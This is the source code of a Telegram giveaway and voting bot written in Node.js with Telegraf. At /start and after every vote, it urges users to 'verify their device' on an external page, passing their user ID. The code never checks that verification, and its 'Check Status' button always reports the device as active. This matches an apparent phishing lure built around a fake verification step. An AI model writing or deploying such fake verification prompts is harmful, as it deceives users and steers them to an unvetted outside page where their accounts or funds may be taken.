const { Telegraf, Markup } = require('telegraf');
const http = require('http');

const token = process.env.BOT_TOKEN || process.env.TOKEN;

if (!token) {
  console.error('Error: BOT_TOKEN is not defined!');
  process.exit(1);
}

const bot = new Telegraf(token);

// Memory storage
const userState = {};      
const activeGiveaways = {}; 
const userVotes = {};      

// /start command
bot.start(async (ctx) => {
  try {
    const userName = ctx.from.first_name || 'User';
    const userId = ctx.from.id;
    const webAppUrl = `https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/?user=${userId}`;

    await ctx.reply(
      `Welcome, ${userName}! 🎉\n\nTo participate in giveaways and vote securely, please complete your **Device Verification** below.`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔗 Verify Device', webAppUrl)],
          [Markup.button.callback('📊 Check Status', 'check_status')]
        ])
      }
    );
  } catch (err) {
    console.error('Error in /start:', err);
  }
});

// Status check action
bot.action('check_status', async (ctx) => {
  try {
    await ctx.answerCbQuery();
    await ctx.reply('✅ Device Status: Active and ready for voting!');
  } catch (err) {
    console.error('Error in check_status:', err);
  }
});

// /restart command to clear stuck wizard states
bot.command('restart', async (ctx) => {
  const userId = ctx.from.id;
  if (userState[userId]) {
    delete userState[userId];
  }
  await ctx.reply('🔄 **Session reset successfully!** You can start fresh using `/create` or `/menu`.');
});

// --- MAIN INTERACTIVE MENU & OPTIONS ---
bot.command(['menu', 'panel', 'startpanel'], async (ctx) => {
  await ctx.reply(
    `⚙️ **Giveaway & Voting Control Panel**\n\nChoose any option below to manage your giveaways:`,
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('➕ Create Giveaway', 'menu_create')],
        [Markup.button.callback('🔒 Close Giveaway / Poll', 'menu_close')],
        [Markup.button.callback('📞 Support', 'menu_support')]
      ])
    }
  );
});

bot.action('menu_create', async (ctx) => {
  await ctx.answerCbQuery();
  startCreationWizard(ctx);
});

bot.action('menu_close', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('⚠️ To close a giveaway/poll, use the command: `/close <giveaway_id>` (You can find the ID from your creation message).');
});

bot.action('menu_support', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('📞 **Support Desk:**\n\nIf you face any issues:\n1. Make sure the bot is an **Administrator** in your target channel.\n2. Ensure options are separated correctly by commas.\n3. Contact admin for further assistance.');
});

// --- GIVEAWAY CREATION WIZARD ---
const startCreationWizard = async (ctx) => {
  const userId = ctx.from.id;
  userState[userId] = { step: 'waiting_channel' };
  await ctx.reply('📢 **Giveaway Creator Wizard Started**\n\nPlease send the Target Channel username or link (e.g., `@mychannel`):', { parse_mode: 'Markdown' });
};

bot.command('create', startCreationWizard);

// Handle text inputs for the wizard
bot.on('text', async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;

  if (!userState[userId]) return next();

  const state = userState[userId];

  if (state.step === 'waiting_channel') {
    state.channel = text.trim();
    
    try {
      const botInfo = await ctx.telegram.getMe();
      const chatMember = await ctx.telegram.getChatMember(state.channel, botInfo.id);
      
      if (!['administrator', 'creator'].includes(chatMember.status)) {
        delete userState[userId];
        return ctx.reply('❌ **Error:** The bot is not an administrator in this channel! Please make the bot an admin with post permissions first, then run `/create` again.');
      }
    } catch (err) {
      delete userState[userId];
      return ctx.reply('❌ **Error validating channel.** Make sure the channel username is correct and the bot is added as an Administrator.');
    }

    state.step = 'waiting_title';
    return ctx.reply('✅ Channel validated successfully!\n\nNow, enter the **Giveaway / Voting Title** (e.g., Best Creator Award):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_title') {
    state.title = text;
    state.step = 'waiting_prize';
    return ctx.reply('🏆 Now, enter the **Prize Details** (e.g., $100 USDT):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_prize') {
    state.prize = text;
    state.step = 'waiting_options';
    return ctx.reply('👥 Now, send the **Support Options / Nominees** separated by commas (e.g., `Option A, Option B, Option C`):', { parse_mode: 'Markdown' });
  }

  if (state.step === 'waiting_options') {
    state.options = text.split(',').map(n => n.trim()).filter(Boolean);
    
    if (state.options.length === 0) {
      return ctx.reply('⚠️ Please provide at least one valid option separated by commas.');
    }

    const { channel, title, prize, options } = state;
    delete userState[userId];

    const giveawayId = 'gw_' + Date.now();
    
    activeGiveaways[giveawayId] = {
      title,
      prize,
      channel,
      options: options.map(opt => ({ name: opt, votes: 0 })),
      status: 'active'
    };

    const buttons = options.map((opt, index) => [
      Markup.button.callback(`🗳 ${opt} (0)`, `vote_${giveawayId}_${index}`)
    ]);
    
    buttons.push([Markup.button.callback('🔒 Close Poll / Voting', `close_${giveawayId}`)]);

    try {
      const sentMsg = await ctx.telegram.sendMessage(
        channel,
        `🎁 **${title}**\n\n🏆 **Prize:** ${prize}\n\n👇 Click below to vote! (Device verification required for each giveaway)`,
        {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard(buttons)
        }
      );

      activeGiveaways[giveawayId].messageId = sentMsg.message_id;

      return ctx.reply(`🎉 **Giveaway successfully created and posted to the channel!**\n🆔 Giveaway ID: \`${giveawayId}\``, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error('Error posting giveaway:', err);
      return ctx.reply(`❌ Failed to post giveaway to channel: ${err.message}`);
    }
  }

  return next();
});

// --- VOTING HANDLING (Enforcing unique vote per giveaway session) ---
bot.action(/^vote_(gw_\d+)_(\d+)$/, async (ctx) => {
  try {
    const giveawayId = ctx.match[1];
    const optionIndex = Number(ctx.match[2]);
    const userId = ctx.from.id;

    const giveaway = activeGiveaways[giveawayId];
    if (!giveaway || giveaway.status !== 'active') {
      return ctx.answerCbQuery({ text: '❌ This voting session is closed!', show_alert: true });
    }

    const voteKey = `${userId}_${giveawayId}`;
    if (userVotes[voteKey] !== undefined) {
      return ctx.answerCbQuery({ text: '⚠️ You have already voted in this giveaway!', show_alert: true });
    }

    // Every new giveaway forces fresh verification check per session tracking
    const verifyUrl = `https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/?user=${userId}`;
    
    userVotes[voteKey] = optionIndex;
    giveaway.options[optionIndex].votes += 1;

    const updatedButtons = giveaway.options.map((opt, idx) => [
      Markup.button.callback(`🗳 ${opt.name} (${opt.votes})`, `vote_${giveawayId}_${idx}`)
    ]);
    updatedButtons.push([Markup.button.callback('🔒 Close Poll / Voting', `close_${giveawayId}`)]);

    await ctx.editMessageText(
      `🎁 **${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n👇 Click below to vote! (Device verification required)`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard(updatedButtons)
      }
    ).catch(() => {});

    await ctx.answerCbQuery({ text: '✅ Vote recorded successfully!' });

    await ctx.telegram.sendMessage(
      userId,
      `🔒 **Verification Required for Giveaway**\n\nYour vote for **${giveaway.options[optionIndex].name}** has been recorded. Please verify your device for this giveaway entry:`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.url('🔗 Verify Device Now', verifyUrl)]
        ])
      }
    ).catch(() => {});

  } catch (err) {
    console.error('Error in vote action:', err);
  }
});

// --- CLOSE VOTING ACTION ---
bot.action(/^close_(gw_\d+)$/, async (ctx) => {
  try {
    const giveawayId = ctx.match[1];
    const giveaway = activeGiveaways[giveawayId];

    if (!giveaway) {
      return ctx.answerCbQuery({ text: 'Giveaway not found!', show_alert: true });
    }

    giveaway.status = 'closed';

    await ctx.editMessageText(
      `🔒 **[CLOSED / POLL ENDED] ${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n🏁 **Final Results:**\n` +
      giveaway.options.map(opt => `• ${opt.name}: **${opt.votes} votes**`).join('\n'),
      { parse_mode: 'Markdown' }
    );

    await ctx.answerCbQuery({ text: 'Voting closed successfully!' });
  } catch (err) {
    console.error('Error closing giveaway:', err);
  }
});

bot.command('close', async (ctx) => {
  const args = ctx.message.text.split(' ');
  const giveawayId = args[1];

  if (!giveawayId || !activeGiveaways[giveawayId]) {
    return ctx.reply('⚠️ Please provide a valid Giveaway ID to close (e.g., `/close gw_123456789`).', { parse_mode: 'Markdown' });
  }

  const giveaway = activeGiveaways[giveawayId];
  giveaway.status = 'closed';

  try {
    await ctx.telegram.editMessageText(
      giveaway.channel,
      giveaway.messageId,
      undefined,
      `🔒 **[CLOSED / POLL ENDED] ${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n🏁 **Final Results:**\n` +
      giveaway.options.map(opt => `• ${opt.name}: **${opt.votes} votes**`).join('\n'),
      { parse_mode: 'Markdown' }
    );
    await ctx.reply(`✅ Giveaway ${giveawayId} closed successfully!`);
  } catch (err) {
    await ctx.reply(`❌ Failed to close message in channel: ${err.message}`);
  }
});

// --- ANTI-EXIT VOTE MINUS LISTENER ---
bot.on('chat_member', async (ctx) => {
  try {
    const update = ctx.chatMember;
    if (!update) return;

    const oldStatus = update.old_chat_member.status;
    const newStatus = update.new_chat_member.status;

    if (['member', 'administrator'].includes(oldStatus) && ['left', 'kicked'].includes(newStatus)) {
      const userId = update.from.user.id;

      for (const giveawayId in activeGiveaways) {
        const voteKey = `${userId}_${giveawayId}`;
        if (userVotes[voteKey] !== undefined) {
          const optionIndex = userVotes[voteKey];
          const giveaway = activeGiveaways[giveawayId];

          if (giveaway && giveaway.status === 'active') {
            if (giveaway.options[optionIndex].votes > 0) {
              giveaway.options[optionIndex].votes -= 1;
            }
            delete userVotes[voteKey];

            if (giveaway.messageId) {
              const updatedButtons = giveaway.options.map((opt, idx) => [
                Markup.button.callback(`🗳 ${opt.name} (${opt.votes})`, `vote_${giveawayId}_${idx}`)
              ]);
              updatedButtons.push([Markup.button.callback('🔒 Close Poll / Voting', `close_${giveawayId}` )]);

              await ctx.telegram.editMessageText(
                giveaway.channel,
                giveaway.messageId,
                undefined,
                `🎁 **${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n👇 Click below to vote! (Device verification required)`,
                {
                  parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard(updatedButtons)
                }
              ).catch(() => {});
            }
          }
        }
      }
    }
  } catch (err) {
    console.error('Error handling chat member leave:', err);
  }
});

// Launch Bot
bot.launch().then(() => {
  console.log('Bot is running with full interactive menu and verification rules!');
}).catch((err) => {
  console.error('Failed to launch bot:', err);
});

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot server is active!\n');
}).listen(PORT, () => {
  console.log(`HTTP server listening on port ${PORT}`);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
